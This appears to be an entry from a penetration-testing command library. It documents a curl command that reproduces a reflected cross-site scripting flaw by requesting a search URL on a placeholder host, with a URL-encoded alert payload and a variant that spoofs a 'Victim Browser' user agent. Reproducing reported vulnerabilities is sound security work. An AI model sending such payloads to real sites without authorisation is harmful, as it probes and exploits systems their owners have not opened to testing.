---
id: cmd-004
data: >-
  curl -X GET
  "https://target.com/search/node/%27%3Balert%28%27chron0x%27%29%3B%27"
tags:
  - web
  - xss
  - reproduction
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.089Z'
verified: false
validated: true
submitted: true
---
# curl-reproduce-xss

## Command

```bash
curl -X GET "https://target.com/search/node/%27%3Balert%28%27chron0x%27%29%3B%27"
```

## Description

Reproduces the XSS by fetching the direct URL with payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| URL | Direct exploit URL | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/search/node/%27%3Balert%28%27chron0x%27%29%3B%27"
```

### Advanced Usage

```bash
curl -X GET "https://target.com/search/node/%27%3Balert%28%27chron0x%27%29%3B%27" --user-agent "Victim Browser"
```

## Expected Output

Page source with executable script.

## Related

- [[Related Procedure]]
